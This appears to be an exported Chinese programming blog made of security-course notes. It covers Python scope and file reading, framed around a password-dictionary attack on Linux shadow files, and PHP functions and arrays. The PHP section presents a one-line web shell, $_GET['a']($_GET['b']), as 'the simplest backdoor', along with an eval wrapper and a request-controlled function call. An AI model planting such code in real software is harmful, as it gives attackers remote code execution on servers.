class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 08 - 全局变量.py</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="comment"># x = 3</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure><p>函数内部可以直接使用函数外部的变量。</p><h3 id="5-3-3-名字空间"><a href="#5-3-3-名字空间" class="headerlink" title="5.3.3 名字空间"></a>5.3.3 名字空间</h3><p>namespace。</p><p>提到变量作用域，可以想像是否可以“看见”这个标识符。</p><p>任何时候，总有一个到三个活动的作用域，分别为局部、全局和内建。标识符（变量名，函数名）的搜索顺序依次是局部、全局和内建。提到名字空间，可以想像是否有这个标识符。</p><h2 id="5-4-其他特性"><a href="#5-4-其他特性" class="headerlink" title="5.4 其他特性"></a>5.4 其他特性</h2><h3 id="5-4-1-函数属性"><a href="#5-4-1-函数属性" class="headerlink" title="5.4.1 函数属性"></a>5.4.1 函数属性</h3><p>函数属性是就是可以是函数名加上句点<code>add.__</code> 能够访问到的内容。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 09 - 函数的属性.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&quot;add(x, y) means x + y&quot;</span></span><br><span class="line">    <span class="built_in">sum</span> = x + y</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add.__name__)</span><br><span class="line"><span class="built_in">print</span>(add.__doc__)</span><br></pre></td></tr></table></figure><h3 id="5-4-2-内部函数"><a href="#5-4-2-内部函数" class="headerlink" title="5.4.2 内部函数"></a>5.4.2 内部函数</h3><p>在函数体内创建另外一个函数是完全合法的，这种函数叫做内部&#x2F;内嵌函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10 - 内部函数.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;This is function <span class="subst">&#123;a.__name__&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;This is function <span class="subst">&#123;b.__name__&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b()</span><br><span class="line"></span><br><span class="line">a()</span><br></pre></td></tr></table></figure><h3 id="5-4-3-位置参数"><a href="#5-4-3-位置参数" class="headerlink" title="5.4.3 位置参数"></a>5.4.3 位置参数</h3><p>位置参数，与shell 脚本类似，程序名以及参数都以位置参数的方式传递给Python 程序。</p><p>使用sys 模块的argv 列表接收。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 11 - 位置参数.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">x = sys.argv[<span class="number">1</span>]</span><br><span class="line">x = <span class="built_in">int</span>(x)</span><br><span class="line">y = sys.argv[<span class="number">2</span>]</span><br><span class="line">y = <span class="built_in">int</span>(y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">0</span></span>):</span><br><span class="line">    <span class="built_in">sum</span> = x + y</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(x = x, y = y))</span><br></pre></td></tr></table></figure><h1 id="6-文件对象"><a href="#6-文件对象" class="headerlink" title="6.文件对象"></a>6.文件对象</h1><p>需求：Linux shadow 文件破解，从字典文件中读取密码。</p><p>文件读写操作：</p><ul><li>把大象放冰箱里，拢共分几步？</li><li>准备字典文件</li></ul><p>函数速查：</p><table><thead><tr><th>常用函数</th><th>功能</th></tr></thead><tbody><tr><td>f &#x3D; open(‘PATH’)</td><td>打开指定路径的文件f 是文件对象。</td></tr><tr><td>f.read()</td><td>从文件对象中读取文件内容</td></tr><tr><td>f.readline()</td><td>读取一行内容</td></tr><tr><td>f.readlines()</td><td>返回一个列表，元素是文件的每一行内容</td></tr><tr><td>f.write()</td><td>向文件中写入内容</td></tr><tr><td>f.writelines()</td><td>以列表的方式向文件中写入内容。</td></tr><tr><td>f.close()</td><td>关闭文件</td></tr><tr><td>time.sleep()</td><td>沉睡响应的秒数</td></tr></tbody></table><h2 id="6-1-文件打开方式"><a href="#6-1-文件打开方式" class="headerlink" title="6.1 文件打开方式"></a>6.1 文件打开方式</h2><h3 id="6-1-1-打开文件"><a href="#6-1-1-打开文件" class="headerlink" title="6.1.1 打开文件"></a>6.1.1 打开文件</h3><p>使用open() 函数打开文件（打开冰箱门）</p><p>基本语法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&quot;./pass.dic&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(f)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_io.TextIOWrapper&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="6-1-2-关闭文件"><a href="#6-1-2-关闭文件" class="headerlink" title="6.1.2 关闭文件"></a>6.1.2 关闭文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.closed</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="6-1-3-访问模式"><a href="#6-1-3-访问模式" class="headerlink" title="6.1.3 访问模式"></a>6.1.3 访问模式</h3><table><thead><tr><th>访问模式</th><th>操作</th><th>说明</th></tr></thead><tbody><tr><td>r</td><td>以读方式打开</td><td>默认打开文件的方式 文件不存在则报错。</td></tr><tr><td>w</td><td>以写方式打开</td><td>文件存在则清空，不存在则创建。</td></tr><tr><td>a</td><td>以追加模式打开</td><td>不存在则创建。</td></tr><tr><td>+</td><td>以读写模式打开</td><td>如r+，w+，a+。</td></tr><tr><td>b</td><td>以二进制模式打开</td><td>如rb，wb，ab。</td></tr></tbody></table><p>常用打开文件的参数：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">r</span><br><span class="line">w</span><br><span class="line">a</span><br><span class="line">rb</span><br><span class="line">wb</span><br><span class="line">ab</span><br><span class="line">&gt;&gt;&gt; f = open(&quot;./pass.dic&quot;, &quot;r&quot;)</span><br><span class="line">&gt;&gt;&gt; f.closed</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="6-2-文件读取"><a href="#6-2-文件读取" class="headerlink" title="6.2 文件读取"></a>6.2 文件读取</h2><h3 id="6-2-1-read"><a href="#6-2-1-read" class="headerlink" title="6.2.1 read()"></a>6.2.1 read()</h3><p>read() 方法用来读取文件内容。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&quot;./pass.dic&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">&#x27;123456\npassword\nabc123\nqwerty\n1qaz@WSX\na1b2c3\n123.com\ntoor\nzhangsan1990\n88888888&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>read() 方法有点莽，读取文件中所有内容，此方法慎用。</p><p>read() 方法比较适合读取二进制文件，包括exe 程序，图片等文件，不适合读取纯文本文件。</p><h3 id="6-2-2-readline"><a href="#6-2-2-readline" class="headerlink" title="6.2.2 readline()"></a>6.2.2 readline()</h3><p>读取打开文件的一行（读取下个行结束符之前的所有字节），包括行结束符，作为字符串返回。它也有一个可选的size 参数，默认为-1，代表读至行结束符，如果提供了该参数，那么在超过size 个字节后会返回不完整的行。</p><p>该函数每执行一次，向下读取一行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&quot;./pass.dic&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readline()</span><br><span class="line"><span class="string">&#x27;123456\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readline()</span><br><span class="line"><span class="string">&#x27;password\n&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="6-2-3-readlines"><a href="#6-2-3-readlines" class="headerlink" title="6.2.3 readlines()"></a>6.2.3 readlines()</h3><p>readlines() 方法读取所有（剩余的）行然后把它们作为一个元素是字符串的列表返回。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.readlines()</span><br><span class="line">[<span class="string">&#x27;abc123\n&#x27;</span>, <span class="string">&#x27;qwerty\n&#x27;</span>, <span class="string">&#x27;1qaz@WSX\n&#x27;</span>, <span class="string">&#x27;a1b2c3\n&#x27;</span>, <span class="string">&#x27;123.com\n&#x27;</span>, <span class="string">&#x27;toor\n&#x27;</span>, <span class="string">&#x27;zhangsan1990\n&#x27;</span>, <span class="string">&#x27;88888888&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="6-2-4-文件迭代"><a href="#6-2-4-文件迭代" class="headerlink" title="6.2.4 文件迭代"></a>6.2.4 文件迭代</h3><p>如果需要逐行处理文件，可以结合for 循环迭代（遍历）文件。迭代文件的方法与处理其他序列类型的数据类似。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12 - 文件迭代.py</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(file = <span class="string">&quot;./pass.dic&quot;</span>, mode = <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="built_in">print</span>(i.strip())</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>有可能遇到的问题：</p><ul><li>在编程时，f.close() 方法容易忘记写。</li><li>在处理文件时，有可能会遇到异常，导致整个脚本强制退出，f.close() 不会被执行到。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 13 - 文件迭代的改进方法.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file = <span class="string">&quot;./pass.dic&quot;</span>, mode = <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(line.strip())</span><br></pre></td></tr></table></figure><h2 id="6-3-文件输入"><a href="#6-3-文件输入" class="headerlink" title="6.3 文件输入"></a>6.3 文件输入</h2><h3 id="6-3-1-write"><a href="#6-3-1-write" class="headerlink" title="6.3.1 write()"></a>6.3.1 write()</h3><p>write() 内建方法功能与read() 和readline() 相反。它把含有文本数据或二进制数据块的字符串写入到文件中去。写入文件时，不会自动添加行结束标志，需要程序员手工输入。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;sec.dic&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;360\n&#x27;</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;sec.dic&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&quot;eversec\n&quot;</span>)</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="6-3-2-writelines"><a href="#6-3-2-writelines" class="headerlink" title="6.3.2 writelines()"></a>6.3.2 writelines()</h3><p>和readlines() 一样，writelines() 方法是针对列表的操作，它接受一个字符串列表作为参数，将它们写入文件，行结束符并不会被自动加入，所以如果需要的话，必须在调用writelines() 前给每行结尾加上行结束符。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;venustech\n&#x27;</span>, <span class="string">&#x27;nsfocus\n&#x27;</span>, <span class="string">&#x27;topsec\n&#x27;</span>, <span class="string">&#x27;dbappsecrutiy\n&#x27;</span>, <span class="string">&#x27;knownsec\n&#x27;</span>, <span class="string">&#x27;colasoft\n&#x27;</span>, <span class="string">&#x27;sangfor\n&#x27;</span>, <span class="string">&#x27;qianxin\n&#x27;</span>, <span class="string">&#x27;chaitin\n&#x27;</span>, <span class="string">&#x27;sbr-info\n&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;sec.dic&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.writelines(l)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php函数</title>
      <link href="/2022/10/16/%E7%BC%96%E7%A8%8B/php%E5%87%BD%E6%95%B0/"/>
      <url>/2022/10/16/%E7%BC%96%E7%A8%8B/php%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="⾃定义函数"><a href="#⾃定义函数" class="headerlink" title="⾃定义函数"></a>⾃定义函数</h1><p>掌握PHP 语⾔中函数定义的⽅法</p><p>掌握函数的调⽤</p><p>了解变量的作⽤范围</p><p>了解传参过程</p><h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><p>函数就是可以完成固定功能的语句或语句集合，可以重复调⽤。</p><h4 id="函数语⾔结构"><a href="#函数语⾔结构" class="headerlink" title="函数语⾔结构"></a>函数语⾔结构</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">形式参数<span class="number">1</span>,形式参数<span class="number">2</span>...</span>)</span>&#123;</span><br><span class="line"><span class="comment">//函数体</span></span><br><span class="line"><span class="keyword">return</span> 返回值</span><br><span class="line">&#125;</span><br><span class="line">函数名()</span><br></pre></td></tr></table></figure><p>定义⼀个简单的函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// funtion.php</span></span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This is function &quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure><h4 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function.php                                           </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span></span>)</span>&#123;      </span><br><span class="line"><span class="variable">$sum</span> =  <span class="variable">$x</span> + <span class="variable">$y</span>;      </span><br><span class="line"><span class="keyword">return</span>  <span class="variable">$sum</span>;   </span><br><span class="line">&#125;       </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">add</span>(<span class="number">10</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p><strong>注意</strong> </p><p>function 是PHP 的关键字，⽤于完成函数的定义；<br> 函数名的命名，应该避开PHP 关键字，命名规则与变量的命名规则相同；<br> 形式参数，形参，给函数传递参数⽤的，仅作占位⽤；<br> 实际参数，实参，真正参与函数运算的；<br> 函数体，执⾏函数功能的部分。<br> 返回值，返回给调⽤的地⽅，默认返回NULL。</p><h4 id="函数调⽤"><a href="#函数调⽤" class="headerlink" title="函数调⽤"></a>函数调⽤</h4><p>函数的调⽤，函数名加上⼩括号。</p><h4 id="函数调⽤过程"><a href="#函数调⽤过程" class="headerlink" title="函数调⽤过程"></a>函数调⽤过程</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is func &quot;</span>.<span class="keyword">__FUNCTION__</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>.<span class="string">&quot; is starting...&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>.<span class="string">&quot; is stopped!&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">b</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  <strong>注意：</strong></p><p>函数的调⽤，直接函数名字后⾯加上() 即可，() 可以看作是运算符；<br> 调⽤函数之后执⾏的过程是相对独⽴的，互不⼲扰，默认没有联系；<br> 函数执⾏完毕，返回调⽤的位置继续向下执⾏。</p><h4 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h4><p>局部变量<br> 全局变量<br> 超全局变量</p><h6 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h6><p>局部变量，就是在函数内部定义的变量，默认情况下，函数外部不能直接访问函数内部定义的变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My name is <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">get_name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>; <span class="comment">// Notice: Undefined variable: username</span></span><br></pre></td></tr></table></figure><h6 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h6><p>全局变量是在脚本中，函数或类的外部定义的变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"> </span><br><span class="line"> <span class="variable">$username</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;My name is <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="title function_ invoke__">get_name</span>();   <span class="comment">// Notice: Undefined variable: username</span></span><br></pre></td></tr></table></figure><p>注意：PHP 语⾔中，函数内部是没有办法直接调⽤函数外部的变量，这⼀点与JavaScript 和Python 不同。</p><p>可以有如下变通⽅法：</p><p>利⽤函数传参的⽅式。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My name is <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">get_name</span>(<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure><p>⽤global 声明变量是全局变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"> </span><br><span class="line"> <span class="variable">$username</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$username</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;My name is <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="title function_ invoke__">get_name</span>();</span><br></pre></td></tr></table></figure><h4 id="按值传参"><a href="#按值传参" class="headerlink" title="按值传参"></a>按值传参</h4><p>默认传参⽅式。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span></span>)</span>&#123;</span><br><span class="line">   <span class="variable">$sum</span> = <span class="variable">$x</span> + <span class="variable">$y</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$sum</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">add</span>(<span class="number">10</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>对形参的操作，不会改变实参的值。</p><h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>可以给形式参数设置默认值，设置⽅法很简单直接赋值即可！</p><p>给函数默认值的时候，全都给。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$x</span> = <span class="number">0</span>, <span class="variable">$y</span> = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$sum</span> = <span class="variable">$x</span> + <span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$sum</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo add(); // 0</span></span><br><span class="line"><span class="comment">// echo add(10, 3); // 13</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">add</span>(<span class="number">10</span>); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure><p>add(10)，单个参数数字10 是给了x 呢？还是给了y 呢？</p><h1 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h1><p>了解可变函数和基本概念和作⽤<br> 掌握最简单后⻔的写法</p><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>可变函数也叫变量函数，动态函数，函数名可以动态设置和调⽤， 变量() 。这是PHP 特性之⼀，这种特性通常会被攻击者所利⽤。</p><p>直接把函数名赋值给变量，通过修改变量的值，可以实现动态调⽤。PHP ⽀持可变函数的概念。这意味着如果⼀个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执⾏它。 </p><h4 id="动态函数⽰例"><a href="#动态函数⽰例" class="headerlink" title="动态函数⽰例"></a>动态函数⽰例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is function a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is function b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// a();</span></span><br><span class="line"><span class="comment">// b();</span></span><br><span class="line"><span class="comment">// $func_name = &quot;b&quot;;</span></span><br><span class="line"><span class="variable">$func_name</span> = (<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]);</span><br><span class="line"><span class="variable">$func_name</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="最简单后⻔"><a href="#最简单后⻔" class="headerlink" title="最简单后⻔"></a>最简单后⻔</h4><p>通过可变函数实际上可以调⽤任意PHP 函数。   </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);      </span><br></pre></td></tr></table></figure><p> 可变函数不能⽤于，例如echo，print，unset()，isset()，empty()，include，require，eval 等类似的语⾔结构。</p><p>可以使⽤⾃⼰的包装函数来将这些结构⽤作可变函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>内部（内置）函数，PHP 提供许多现成的函数或者语⾔结构，可以直接使⽤。</p><p>具体，可以参考PHP ⼿册。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php数组</title>
      <link href="/2022/10/13/%E7%BC%96%E7%A8%8B/php%E6%95%B0%E7%BB%84/"/>
      <url>/2022/10/13/%E7%BC%96%E7%A8%8B/php%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h1 id="数组概念"><a href="#数组概念" class="headerlink" title="数组概念"></a>数组概念</h1><h3 id="数组概述"><a href="#数组概述" class="headerlink" title="数组概述"></a>数组概述</h3><h5 id="学生信息"><a href="#学生信息" class="headerlink" title="学生信息"></a>学生信息</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"><span class="variable">$sex</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$score</span> = <span class="number">99.9</span>;</span><br><span class="line"><span class="variable">$stu1</span> = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$stu1</span> = <span class="variable">$sex</span>;</span><br><span class="line"><span class="variable">$stu1</span> = <span class="variable">$age</span>;</span><br><span class="line"><span class="variable">$stu1</span> = <span class="variable">$score</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$stu1</span>);</span><br></pre></td></tr></table></figure><p>把学⽣信⼼存储在⼀个变量⾥，需要⽤数组来实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"><span class="variable">$sex</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$score</span> = <span class="number">99.9</span>;</span><br><span class="line"><span class="variable">$stu1</span>[] = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$stu1</span>[] = <span class="variable">$sex</span>;</span><br><span class="line"><span class="variable">$stu1</span>[] = <span class="variable">$age</span>;</span><br><span class="line"><span class="variable">$stu1</span>[] = <span class="variable">$score</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$stu1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="数组特点"><a href="#数组特点" class="headerlink" title="数组特点"></a>数组特点</h5><p>键值对（key-value）； </p><p>键，key，存储数组中，变量的“编号”。</p><p>值，value，存储数组中，变量的值。</p><p>数组中的元素可以是任意类型的数据对象。</p><p>索引数组，变量的“编号”是整数，整数不具备⼀定的语义。 </p><p>关联数组，变量的”编号”⽤字符串表⽰，可以具备⼀定的语义。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"><span class="variable">$sex</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$score</span> = <span class="number">99.9</span>;</span><br><span class="line"><span class="variable">$stu1</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$stu1</span>[<span class="string">&#x27;sex&#x27;</span>] = <span class="variable">$sex</span>;</span><br><span class="line"><span class="variable">$stu1</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="variable">$age</span>;</span><br><span class="line"><span class="variable">$stu1</span>[<span 